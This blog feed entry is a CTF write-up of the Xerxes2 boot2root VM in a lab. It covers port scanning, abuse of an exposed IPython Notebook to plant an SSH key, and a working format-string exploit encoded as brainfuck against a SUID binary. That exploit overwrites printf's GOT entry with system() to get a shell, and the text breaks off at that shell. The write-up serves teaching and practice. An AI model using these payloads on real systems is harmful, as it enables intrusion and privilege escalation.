    <link href="http://leonjza.github.io/blog/2014/08/09/beating-xerxes2/"/>
    <updated>2014-08-09T16:59:53+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/08/09/beating-xerxes2</id>
    <content type="html"><![CDATA[<h2>foreword</h2>

<p>Xerxes2 is a successor in a boot2root series by <a href="https://twitter.com/barrebas">@barrebas</a> hosted by <a href="https://twitter.com/vulnhub">@VulnHub</a>. If you haven&rsquo;t done it yet, close this article <em>now</em> and go learn by doing it!</p>

<p>Xerxes2, like most other boot2root type CTF&rsquo;s, has once again forced me to learn a whole lot more than I thought possible. In total it took me about 3 or 4 days on and off to complete. The goal was as usual, read <code>/root/flag.txt</code>. This is the path I took to read the flag and gain root command execution. Enjoy!</p>

<h2>getting started</h2>

<p>The tool of choice for Xerxes2 was again Kali Linux. I started up the VM and got the IP Address 192.158.56.102 assigned to it. So, to officially kick off the challenge, I started a NMAP scan:</p>

<p>```bash nmap of 192.168.56.102 (cleaned up)
root@kali:~# nmap -v &mdash;reason -sV 192.168.56.102 -p-</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-08-09 17:14 SAST
[&hellip;]
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
80/tcp    open  http    syn-ack lighttpd 1.4.31
111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
4444/tcp  open  krb524? syn-ack
8888/tcp  open  http    syn-ack Tornado httpd 2.3
57504/tcp open  status  syn-ack 1 (RPC #100024)
[&hellip;]
Nmap done: 1 IP address (1 host up) scanned in 192.62 seconds</p>

<pre><code>       Raw packets sent: 131149 (5.770MB) | Rcvd: 88 (3.544KB)
</code></pre>

<p>```</p>

<p>Well this gives us a boat load to test out already!</p>

<p>I quickly telneted’ to tcp/4444, and got presented with a large string being echoed back. To the eye this looked like a very large base64 string, so I opened <code>nc</code> to the port and redirected the output to a file <code>nc-string</code>. Once the string echoed completely, I quit the <code>nc</code>, and pushed the resultant string through a base64 decode and ran a <code>file</code> against it:</p>

<p>```bash String from tcp/4444
root@kali:~#  nc 192.168.56.102 4444 | tee nc-string
[&hellip;]
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqkxBTUUzLjk5LjWqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq//OCxDsAAANIAAAA
AKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqo=
^C</p>

<p>root@kali:~# cat nc-string | base64 -d > nc-data
root@kali:~# file nc-data
nc-data: MPEG ADTS, layer III, v2,  64 kbps, 22.05 kHz, Monaural</p>

<p>```</p>

<p><code>nc-data</code> is a, audio file? Ok. I copied the file off Kali Linux, opened it in VLC player and pressed play.</p>

<p><em>(Electronic Noises &amp; Robot Voice)</em> <em>This is Xerxes. Why do you persist in your loneliness?</em> <em>(Electronic Noises)</em></p>

<p>The start and end of the voice message had a clear in &amp; out sound, with some static noises in the background. Then, at the end a strange whistling noise could be heard.</p>

<p>This was the first educational bus ride the Xerxes2 took me on. Learning about the structures of mp3 files etc.</p>

<p>Sadly, this file kept me busy for quite some time, trying to find a hidden message. In the end, I gave up and moved on to the other ports open the VM. Maybe I had to come back to this later, but the little progress I had made had me hope I didn&rsquo;t have to.</p>

<h2>first shell access</h2>

<p>Moving on to tcp/80, a standard website with not much interesting apart from a cool looking Xerxes2 logo was found:</p>

<p><img class="<a" src="href="https://i.imgur.com/67BEjmV.png">https://i.imgur.com/67BEjmV.png</a>"></p>

<p>However, moving on to tcp/8888, we see it identified as <code>Tornado httpd 2.3</code>. Some of you may recognize Tornado as a python httpd server. So, off to a browser we go!</p>

<p>tcp/8888 hosted a <a href="http://ipython.org/notebook.html">IPython Notebook</a>. We were able to easily create a new note, and abuse the shell command functionality of it for our own purposes. Shell command access could be achieved by prefixing typical shell commands with a <code>!</code>. I used this to enumerate a small bit of the current environment, and quickly decided to add myself a ssh key so that I can play further. So, I generated a new key pair just for Xerxes, and uploaded it for the <code>delacroix</code> user:</p>

<p><img class="<a" src="href="https://i.imgur.com/JrTDTPn.png">https://i.imgur.com/JrTDTPn.png</a>"></p>

<p>And then a easy SSH in:</p>

<p>```bash
root@kali:~# ssh -i delacroix <a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#100;&#101;&#108;&#x61;&#x63;&#114;&#x6f;&#105;&#x78;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#46;&#x35;&#54;&#x2e;&#x31;&#48;&#50;">&#x64;&#101;&#108;&#x61;&#99;&#x72;&#111;&#x69;&#x78;&#x40;&#49;&#57;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#x35;&#x36;&#x2e;&#49;&#x30;&#x32;</a>
The authenticity of host &lsquo;192.168.56.102 (192.168.56.102)&rsquo; can&rsquo;t be established.
ECDSA key fingerprint is c1:ca:ae:c3:5d:7a:5b:9d:cf:27:a4:48:83:1e:01:84.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;192.168.56.102&rsquo; (ECDSA) to the list of known hosts.</p>

<p>Welcome to xerxes2.</p>

<pre><code>  XERXES wishes you
   a pleasant stay.
</code></pre>

<hr />

<p><code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
</code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M'  <code>Mb MM'   </code> MM'  <code>Mb
 </code>MM,P   MM    MM MM'      <code>MM,P   MM    MM YM.           ,MM
  </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
   d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M'  <br/>
  d' <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M'    <br/>
<em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM</p>

<p>delacroix@xerxes2:~$
```</p>

<h2>becoming polito &ndash; the why</h2>

<p>Once I had the first SSH access, life was a little less complicated. I could enumerate easier and learn the details about what I was facing. Things that stood out was a binary <code>/opt/bf</code>, owned by <code>polito</code> and had the SUID bit set for him. There was also a folder <code>/opt/backup</code>, with a file <code>korenchkin.tar.enc</code>. There was also mail in <code>/var/mail</code> for the user <code>korenchkin</code> which I am not able to read yet.</p>

<p>More interestingly, the <code>.bash_history</code> for the user I am now (delacroix), revealed that the <code>/opt/bf</code> command was recently run, and the sources for this binary was available as <code>bf.c</code>.</p>

<p>```bash delacroix Home and history
delacroix@xerxes2:~$ ls -lh
total 8.0K
-rw-r&mdash;r&mdash; 1 delacroix delacroix 1.6K Jul 16 12:42 bf.c
-rw-r&mdash;r&mdash; 1 delacroix delacroix  100 Aug  9 10:23 Untitled0.ipynb</p>

<p>delacroix@xerxes2:~$ history</p>

<pre><code>1  cd
2  ls -alh
3  /opt/bf "&lt;&lt;++++[&gt;++++&lt;-]&gt;[&gt;+++++&gt;+++++&gt;+++++&gt;+++++&gt;++&gt;++++&gt;++++&gt;++++&gt;+++++&gt;++++&gt;+++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;----&gt;-&gt;-&gt;-----&gt;&gt;++++&gt;+++++&gt;+++++&gt;&gt;+++++&gt;++#"
4  cp /media/politousb/bf.c .
5  nano bf.c
6  exit
7  passwd
8  exit
</code></pre>

<p>delacroix@xerxes2:~$ /opt/bf &ldquo;&lt;&lt;++++[>++++&lt;&ndash;]>[>+++++>+++++>+++++>+++++>++>++++>++++>++++>+++++>++++>+++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&ndash;]>&mdash;&mdash;>&ndash;>&ndash;>&mdash;&mdash;&ndash;>>++++>+++++>+++++>>+++++>++#&rdquo;
LOOK DEEPERdelacroix@xerxes2:~$
```</p>

<p>As you can see above, running it just prints <strong>LOOK DEEPER</strong>. I recognized the syntax as <a href="http://en.wikipedia.org/wiki/Brainfuck">brainfk</a> and figured that <code>/opt/bf</code> was simply a brainfk interpreter. But wait, lets inspect <code>bf.c</code>!</p>

<h3>inspecting bf.c</h3>

<p>A quick read of <code>bf.c</code> confirmed the suspicions that <code>/opt/bf</code> was simply a brainfk interpreter. A buffer was set for the input program, then a function called <code>bf()</code> was called to process the brainfk program. Each instruction in the brainfk was handled with a case statement:</p>

<p>```c bf.c brainfk interpreter
case &lsquo;.&rsquo;:</p>

<pre><code>printf("%c", buf[datapointer]);
break;
</code></pre>

<p>case &lsquo;,&rsquo;:</p>

<pre><code>buf[datapointer] = getchar();
break;
</code></pre>

<p>case &lsquo;>&rsquo;:</p>

<pre><code>datapointer = (datapointer == (BUF_SIZE-1)) ? 0 : ++datapointer;
break;
</code></pre>

<p>case &lsquo;&lt;&rsquo;:</p>

<pre><code>datapointer = (datapointer == 0) ? (BUF_SIZE-1) : --datapointer;
break;
</code></pre>

<p>case &lsquo;+&rsquo;:</p>

<pre><code>buf[datapointer]++;
break;
</code></pre>

<p>case &lsquo;&ndash;&rsquo;:</p>

<pre><code>buf[datapointer]--;
</code></pre>

<p>```</p>

<p>Soooo, here we started on the second educational bus ride to mount brainfk. In summary, I learnt that I could write a program as simple as <code>,.</code>, and run it with <code>/opt/bf</code>, which will accept a character and then echo it back to me immediately. I also learnt that if you had say, 62 <code>+</code>, and ran that with a brainfk interpreter like <code>/opt/bf</code>, then you would have the character with ASCII value 62 in memory. You can then print that value with <code>.</code>, or move on the next memory cell with a <code>&lt;</code>. The most important thing to learn about brainfk was, <em>there are no high level features. No file IO, no socket IO, nothing</em>.</p>

<p>That was our brainfk class for the day.</p>

<h3>finding the bf vuln</h3>

<p>With all that brainfk, I was still not closer to actually finding the stepping stone to the next part of Xerxes2. That was until I re-read <code>bf.c</code>, and realized that one of the case statements was for <code>#</code>, and that when a hash is present it will run:</p>

<p>```c bf.c format string vulnerability
case &lsquo;#&rsquo;:</p>

<pre><code>// new feature
printf(buf);
break;
</code></pre>

<p>```</p>

<p>Classic format string vulnerability!</p>

<p>As exciting as this may seem, it was not really for me. I had already previously struggled with a format string vulnerability, and this case it was present so early in the CTF that I feared I would not be able to complete this one. However, the goal was now clear. I need to <em>somehow</em> exploit this format string vuln, as brainfk, and get that to run my own code, potentially gaining me a shell as <code>polito</code>.</p>

<h2>becoming polito &ndash; the how</h2>

<p>Doing research about format string vulnerabilities, you will see that generally the flow goes something along the lines of:</p>

<ul>
<li>print <code>AAAA%x%x%x%x</code>, adding <code>%s</code> until you see the hex for of A (41), meaning that you are trying to find the position in the stack that <code>printf</code> is placing the arguments.</li>
<li>Test for direct parameter access. Assuming you saw the 41414141 in position 16, test with a payload of <code>AAAA%16$x</code>.</li>
<li><code>objdump -R /your/bin</code> and find a call in the GOT to override.</li>
<li>Place some shellcode as environment variable, ie: <code>EGG</code>, prefixed with say 200 <code>0x90</code>.</li>
<li>use <code>gdb</code>, and find your NOP sled, and choose a position in memory to where you want to override the pointer for a call from the GOT.</li>
<li>Calculate the required padding of strings to get the correct memory address, and write it using the <code>%n</code> format string.</li>
<li>Profit?</li>
</ul>


<p>While this is all fine and dandy, it was not possible for me to <em>profit</em> with this. :( In fact, the there is nothing wrong with the theory, its just that the conditions were slightly different. <code>/opt/bf</code> was compiled with the NX bit, and ASLR is enabled. Oh, and I actually have no idea what I am doing :D</p>

<p>So, let me take this step by step on how <code>/opt/bf</code> can be exploited using a format string vulnerability, encoded in brainfk, with the NX bit set and ASLR enabled.</p>

<h3>/opt/bf &ndash; part1</h3>

<p>To start, I had to recap in the sadly limited knowledge I already have of format string vulnerabilities. Some resources I found useful were:</p>

<ul>
<li><a href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html">http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html</a></li>
<li><a href="http://codearcana.com/posts/2013/04/28/picoctf-videos.html">http://codearcana.com/posts/2013/04/28/picoctf-videos.html</a></li>
<li><a href="http://youtu.be/NwzmYSlETI8">http://youtu.be/NwzmYSlETI8</a></li>
<li><a href="http://youtu.be/CHrs30g-3O0">http://youtu.be/CHrs30g-3O0</a></li>
</ul>


<p>So, lets work with this.</p>

<p>First of all, the program will only <code>printf(buf)</code> the buffer which is brainfk. This is triggered with a <code>#</code>. For us to be able to do anything even remotely related to brainfk, we need to ensure that our payloads are encoded into brainfk before it gets fed to <code>/opt/bf</code>. Remembering the research that was done, I opted to print as many <code>+</code>&rsquo;s as the ASCII value of the character I wanted, and them simply increment the data cell with <code>&gt;</code>, preparing for the next character.</p>

<p>To test my theory, I prepared my first payload using <code>python -c</code>:</p>

<p><code>bash brainfk payload encoding (cleaned up)
delacroix@xerxes2:~$ echo $(python -c 'print "+" * ord("a")')
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
delacroix@xerxes2:~$ /opt/bf "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#"
a
</code></p>

<p>That printed the character <code>a</code> as expected. Great! However, we need to be able to print far more character, and multiples too, so lets see if we increment the pointer by 1 will it <code>printf(buf)</code> that too?</p>

<p><code>bash brainfk payload encoding multiple characters (cleanedup)
delacroix@xerxes2:~$ /opt/bf "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#"
aa
</code></p>

<p>2 <code>a</code>! Awesome. So the theory works. However, the last thing I was going to do was copy paste all that crap, so instead, lets write some python and use <a href="https://docs.python.org/2/tutorial/datastructures.html#list-comprehensions">list comprehension</a> to prepare our payloads for <code>/opt/bf</code>:</p>

<p><code>python final brainfk encoding for /opt/bf
print "&gt;".join(["+" * ord(x) for x in ("the quick brown fox")])
</code></p>

<p>You can copy and paste the above command into a python shell and see the amount of <code>+</code> there are haha.</p>

<p>Anyways, that settled the brainfk problem.</p>

<h3>/opt/bf &ndash; part2</h3>

<p>Now that we can easily provide input to <code>/opt/bf</code> to print using the vulnerable <code>printf()</code> function, it was time to test the actual format string vulnerability. Just like the above mentioned resources (and many many others on the internet) have shown, we provide some <code>AAAA</code> and search for them:</p>

<p><code>bash /opt/bf format string testing
delacroix@xerxes2:~$ /opt/bf "$(python -c 'print "&gt;".join(["+" * ord(x) for x in ("AAAA" + ".%x" * 20 + "\n")])')#"
AAAA.b777bff4.0.0.bf842d58.b779b9c0.40.112a.bf83b820.b777bff4.bf842d58.80486eb.bf843860.bf83b820.7530.0.41414141.2e78252e.252e7825.78252e78.2e78252e
</code></p>

<p>Here we are using the previously built brainfk payload generator, and giving it format strings, searching for the <code>AAAA</code> input we have given it. Instead of typing like 20 <code>%s</code>, I just use python to do the hard work for me. As you can see, the string <code>41414141</code> is present in the output. We can test if we are able to use direct parameter access to access just the string we want:</p>

<p><code>bash /opt/bf format string direct parameter access
delacroix@xerxes2:~$ /opt/bf "$(python -c 'print "&gt;".join(["+" * ord(x) for x in ("AAAA" + ".%16$x" "\n")])')#"
AAAA.41414141
</code></p>

<p>Yup! Parameter 16 gives us what we need :)</p>

<p>Great. Were making progress&hellip; I think.</p>

<p>For the sake of time, I am not going to document the 412643932471236 attempts that were made at getting this to work. Instead, here is the path that did eventually work. This is the part of Xerxes2 that undoubtedly took me the longest to get right.</p>

<h3>/opt/bf &ndash; part3</h3>

<p>Now that we know where we can start manipulating pointers, we need to find out <em>what</em> we should manipulate. There are many options here, however your decision on which path to take is influenced by many vectors.</p>

<p>First of all, <code>/opt/bf</code> was compiled with the NX bit:</p>

<p><code>bash /opt/bf RW Only stack
delacroix@xerxes2:~$ readelf -l /opt/bf | grep STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
</code></p>

<p>Secondly, ASLR is enabled, and can be seen when printing the shared library dependencies. The memory positions are different for every check:</p>

<p>```bash ASLR check on /opt/bf
delacroix@xerxes2:~$ ldd /opt/bf</p>

<pre><code>linux-gate.so.1 =&gt;  (0xb7734000)
libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb75c9000)
/lib/ld-linux.so.2 (0xb7735000)
</code></pre>

<p>delacroix@xerxes2:~$ ldd /opt/bf</p>

<pre><code>linux-gate.so.1 =&gt;  (0xb779b000)
libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7630000)
/lib/ld-linux.so.2 (0xb779c000)
</code></pre>

<p>delacroix@xerxes2:~$ ldd /opt/bf</p>

<pre><code>linux-gate.so.1 =&gt;  (0xb77c0000)
libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7655000)
/lib/ld-linux.so.2 (0xb77c1000)
</code></pre>

<p>delacroix@xerxes2:~$
```</p>

<p>Thankfully, since this is a x86 (32bit) OS, its quite trivial to disable this (sort of) with <code>ulimit -s unlimited</code></p>

<p>```bash ASLR disable
delacroix@xerxes2:~$ ulimit -s unlimited</p>

<p>delacroix@xerxes2:~$ ldd /opt/bf</p>

<pre><code>linux-gate.so.1 =&gt;  (0x4001e000)
libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0x40026000)
/lib/ld-linux.so.2 (0x40000000)
</code></pre>

<p>delacroix@xerxes2:~$ ldd /opt/bf</p>

<pre><code>linux-gate.so.1 =&gt;  (0x4001e000)
libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0x40026000)
/lib/ld-linux.so.2 (0x40000000)
</code></pre>

<p>delacroix@xerxes2:~$ ldd /opt/bf</p>

<pre><code>linux-gate.so.1 =&gt;  (0x4001e000)
libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0x40026000)
/lib/ld-linux.so.2 (0x40000000)
</code></pre>

<p>delacroix@xerxes2:~$
```</p>

<p>The memory locations are now static :) With that done, lets have a look at what pointer we would like to override, and then where we should be overwriting it to. We first take a look at the Global Offset Table:</p>

<p>```bash /bin/opt GOT
delacroix@xerxes2:~$ objdump -R /opt/bf</p>

<p>/opt/bf:     file format elf32-i386</p>

<p>DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049a38 R_386_GLOB_DAT    <strong>gmon_start</strong>
08049a48 R_386_JUMP_SLOT   printf
08049a4c R_386_JUMP_SLOT   getchar
08049a50 R_386_JUMP_SLOT   <strong>gmon_start</strong>
08049a54 R_386_JUMP_SLOT   exit
08049a58 R_386_JUMP_SLOT   __libc_start_main
08049a5c R_386_JUMP_SLOT   memset
08049a60 R_386_JUMP_SLOT   putchar</p>

<p>delacroix@xerxes2:~$
```</p>

<p>Here, we will choose to override the <code>printf</code> functions pointer. This is at 0x08049a48. So, this address will have the location of our <em>evil code</em>. But now, how do we know where the evil code is and <em>what</em> is it? Again, this was another interesting thing that had me researching for a very long time. In the end, it came to light that there is such a thing as <a href="http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf">ret2libc</a>. The basic idea here is that we override the pointer for <code>printf</code> to <code>system</code> with a argument. I highly recommend you read <a href="http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf">this pdf</a> for a proper explanation on what exactly this means.</p>

<p>The only thing that is left to determine is where <code>system</code> is in memory. Luckily this is also pretty easy to find out. Fire up <code>gdb</code>, run the binary and <code>print system</code> to get the address:</p>

<p><code>bash libc's system
delacroix@xerxes2:~$ gdb -q /opt/bf
Reading symbols from /opt/bf...(no debugging symbols found)...done.
(gdb) run
Starting program: /opt/bf
usage: /opt/bf [program]
[Inferior 1 (process 11342) exited with code 0377]
(gdb) print system
$1 = {&lt;text variable, no debug info&gt;} 0x40062000 &lt;system&gt;
(gdb)
</code></p>

<p>Soooo, 0x40062000. We have the point in memory where <code>system()</code> lives, and we know where the program is going to go to lookup the <code>printf</code> function. All that is left now is to exploit the format string vulnerability, override the location of <code>printf</code> with <code>system</code>, and provide a new argument for the now fooled <code>printf</code> to run. A new argument can be given by simply providing another <code>#</code> (remember we have the source so that was easy to figure out).</p>

<h3>/opt/bf &ndash; part4</h3>

<p>We have all the information we need, lets get to work.</p>

<p>We fire up <code>gdb</code>, and instead of printing the location of <code>AAAA</code>, we provide a memory address, with a <code>%n</code> format string so that we can write the amount of bites needed to override the pointer location.</p>

<p>To aid in getting the exact amount of padding right, we will set a breakpoint just before the application finished so that we can examine the pointer 0x08049a48 from the GOT:</p>

<p>```bash
delacroix@xerxes2:~$ gdb -q /opt/bf
Reading symbols from /opt/bf&hellip;(no debugging symbols found)&hellip;done.</p>

<p>(gdb) disass main
Dump of assembler code for function main:
   0x08048684 &lt;+0>: push   %ebp
   0x08048685 &lt;+1>: mov    %esp,%ebp
   0x08048687 &lt;+3>: and    $0xfffffff0,%esp
   0x0804868a &lt;+6>: sub    $0x7540,%esp
   0x08048690 &lt;+12>:    cmpl   $0x1,0x8(%ebp)
   0x08048694 &lt;+16>:    jg     0x80486b7 &lt;main+51>
   0x08048696 &lt;+18>:    mov    0xc(%ebp),%eax
   0x08048699 &lt;+21>:    mov    (%eax),%eax
   0x0804869b &lt;+23>:    mov    %eax,0x4(%esp)
   0x0804869f &lt;+27>:    movl   $0x804887c,(%esp)
   0x080486a6 &lt;+34>:    call   0x8048390 &lt;printf@plt>
   0x080486ab &lt;+39>:    movl   $0xffffffff,(%esp)
   0x080486b2 &lt;+46>:    call   0x80483c0 &lt;exit@plt>
   0x080486b7 &lt;+51>:    movl   $0x7530,0x8(%esp)
   0x080486bf &lt;+59>:    movl   $0x0,0x4(%esp)
   0x080486c7 &lt;+67>:    lea    0x10(%esp),%eax
   0x080486cb &lt;+71>:    mov    %eax,(%esp)
   0x080486ce &lt;+74>:    call   0x80483e0 &lt;memset@plt>
   0x080486d3 &lt;+79>:    mov    0xc(%ebp),%eax
   0x080486d6 &lt;+82>:    add    $0x4,%eax
   0x080486d9 &lt;+85>:    mov    (%eax),%eax
   0x080486db &lt;+87>:    lea    0x10(%esp),%edx
   0x080486df &lt;+91>:    mov    %edx,0x4(%esp)
   0x080486e3 &lt;+95>:    mov    %eax,(%esp)
   0x080486e6 &lt;+98>:    call   0x80484ec <bf>
   0x080486eb &lt;+103>:   movl   $0x0,(%esp) # &lt;&mdash; we will break here
   0x080486f2 &lt;+110>:   call   0x80483c0 &lt;exit@plt>
End of assembler dump.</p>

<p>(gdb) break *0x080486eb
Breakpoint 1 at 0x80486eb</p>

<p>(gdb) run &ldquo;$(python -c &lsquo;print &rdquo;>&ldquo;.join([&rdquo;+&ldquo; * ord(x) for x in (&rdquo;\x48\x9a\x04\x08" + &ldquo;%16$n&rdquo;)])&rsquo;)#&ldquo;
Starting program: /opt/bf &rdquo;$(python -c &lsquo;print &ldquo;>&rdquo;.join([&ldquo;+&rdquo; * ord(x) for x in (&ldquo;\x48\x9a\x04\x08&rdquo; + &ldquo;%16$n&rdquo;)])&rsquo;)#"</p>

<p>Breakpoint 1, 0x080486eb in main ()</p>

<p>(gdb) x/x 0x08049a48
0x8049a48 <a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#58;&#x70;&#114;&#x69;&#110;&#x74;&#102;&#64;&#103;&#111;&#x74;&#46;&#112;&#108;&#116;">&#x70;&#114;&#105;&#110;&#116;&#x66;&#x40;&#103;&#111;&#116;&#x2e;&#112;&#108;&#x74;</a>: 0x00000004
(gdb)
```</p>

<p>Oooooooooooh. So basically 0x8049a48 now says <code>printf</code> lives at 0x00000004. Not entirely true though, but we will fix this. Fixing this is quite easy too. Using some python again, we can calculate the amount of bytes we must write to get the memory location we want. We know we want to write to <code>system</code>, that lives in memory at 0x40062000. We will split the calculation up into 2 parts, and first write the 0x2000, and then the 0x4006. We can see that we have written 4 bytes already, so to calculate the first part, we will simply subtract 4 from 0x2000 and pad parameter 16 with the amount.</p>

<p><code>bash Calculating the first offset
(gdb) shell echo $(python -c 'print 0x2000-0x4')
8188 # output is a decimal value
</code></p>

<p>We now pad the format string as required, re-run the program in <code>gdb</code>, and inspect 0x08049a48 from the GOT</p>

<p>```bash first padded string
(gdb) run &ldquo;$(python -c &lsquo;print &rdquo;>&ldquo;.join([&rdquo;+&ldquo; * ord(x) for x in (&rdquo;\x48\x9a\x04\x08" + &ldquo;%8188u%16$n&rdquo;)])&rsquo;)#&ldquo;
The program being debugged has been started already.
Start it from the beginning? (y or n) y</p>

<p>Starting program: /opt/bf &ldquo;$(python -c &lsquo;print &rdquo;>&ldquo;.join([&rdquo;+&ldquo; * ord(x) for x in (&rdquo;\x48\x9a\x04\x08" + &ldquo;%8188u%16$n&rdquo;)])&rsquo;)#&ldquo;
H�                                                                                                                                                                                                               <br/>
Breakpoint 1, 0x080486eb in main ()
(gdb) x/x 0x08049a48
0x8049a48 <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#112;&#x72;&#x69;&#110;&#x74;&#x66;&#x40;&#x67;&#x6f;&#x74;&#46;&#112;&#x6c;&#116;">&#112;&#114;&#x69;&#110;&#116;&#102;&#x40;&#103;&#111;&#116;&#46;&#x70;&#108;&#x74;</a>: 0x00002000
(gdb)
```</p>

<p>You will see some whitespace output as a result of the <code>%8188u</code>, but inspecting the pointer from GOT reveals that we have the lower part of the memory now set correctly (0x00002000)! :) The upper part of the address is calculated in a similar way, however, we are going to be moving on 2 places in memory to write this value and provide another format string. This means that our lower part of the memory will change as a result, and we will need to compensate for that when we calculate the upper part.</p>

<p>```bash writing upper part of memory and offset change
(gdb) run &ldquo;$(python -c &lsquo;print &rdquo;>&ldquo;.join([&rdquo;+&ldquo; * ord(x) for x in (&rdquo;\x48\x9a\x04\x08" + &ldquo;\x4a\x9a\x04\x08&rdquo; + &ldquo;%8188u%16$n&rdquo; + &ldquo;%17$n&rdquo;)])&rsquo;)#&ldquo;
The program being debugged has been started already.
Start it from the beginning? (y or n) y</p>

<p>Starting program: /opt/bf &ldquo;$(python -c &lsquo;print &rdquo;>&ldquo;.join([&rdquo;+&ldquo; * ord(x) for x in (&rdquo;\x48\x9a\x04\x08" + &ldquo;\x4a\x9a\x04\x08&rdquo; + &ldquo;%8188u%16$n&rdquo; + &ldquo;%17$n&rdquo;)])&rsquo;)#&ldquo;
H�J�                                                                                                                                                                                                              3
Breakpoint 1, 0x080486eb in main ()
(gdb) x/x 0x08049a48
0x8049a48 <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#112;&#x72;&#x69;&#110;&#116;&#102;&#64;&#103;&#x6f;&#x74;&#46;&#x70;&#108;&#x74;">&#x70;&#114;&#105;&#x6e;&#x74;&#x66;&#64;&#103;&#x6f;&#x74;&#x2e;&#x70;&#108;&#x74;</a>: 0x20042004
(gdb)
```</p>

<p>As you can see, we have moved up 4 bytes on the lower part of the address, so we can simply take 4 off 8188 to fix that. To determine the upper part of the address though, we will do another hex calculation and remove the amount that we have from the amount that we want:</p>

<p>```bash calculating the upper part and fixing the offset
(gdb) shell echo $(python -c &lsquo;print 0x4006-0x2000&rsquo;)
8198 # output is a decimal value</p>

<p>(gdb) run &ldquo;$(python -c &lsquo;print &rdquo;>&ldquo;.join([&rdquo;+&ldquo; * ord(x) for x in (&rdquo;\x48\x9a\x04\x08" + &ldquo;\x4a\x9a\x04\x08&rdquo; + &ldquo;%8184u%16$n&rdquo; + &ldquo;%8198u%17$n&rdquo;)])&rsquo;)#&ldquo;
The program being debugged has been started already.
Start it from the beginning? (y or n) y</p>

<p>Starting program: /opt/bf &ldquo;$(python -c &lsquo;print &rdquo;>&ldquo;.join([&rdquo;+&ldquo; * ord(x) for x in (&rdquo;\x48\x9a\x04\x08" + &ldquo;\x4a\x9a\x04\x08&rdquo; + &ldquo;%8184u%16$n&rdquo; + &ldquo;%8198u%17$n&rdquo;)])&rsquo;)#&ldquo;
H�J�                                                                                                                                                                                                             <br/>
Breakpoint 1, 0x080486eb in main ()
(gdb) x/x 0x08049a48
0x8049a48 <a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#111;&#x3a;&#x70;&#114;&#105;&#110;&#x74;&#x66;&#64;&#103;&#x6f;&#x74;&#x2e;&#112;&#108;&#116;">&#x70;&#x72;&#105;&#x6e;&#116;&#102;&#x40;&#x67;&#111;&#116;&#46;&#112;&#x6c;&#116;</a>: 0x40062000
(gdb)
```</p>

<p>w00t. We have rewritten the GOT for <code>printf</code> to the location of the libc <code>system</code> call using the format string vulnerability. Phew.</p>

<h3>/opt/bf &ndash; part5</h3>

<p>Now, all that is left is to get the <code>printf</code> to rerun (using the <code>#</code>) with a payload such as <code>/bin/sh</code>. We will append the <code>/bin/sh</code> to the end and just add another <code>#</code> to call <code>printf</code> (which is now overridden):</p>

<p><code>bash Exploiting bf
delacroix@xerxes2:~$ /opt/bf "$(python -c 'print "&gt;".join(["+" * ord(x) for x in ("\x48\x9a\x04\x08" + "\x4a\x9a\x04\x08" + "%8184u%16$n" + "%8198u%17$n" + ";/bin/sh")])')##"
H�J�                                                                                                                                                                                                              d
$ id
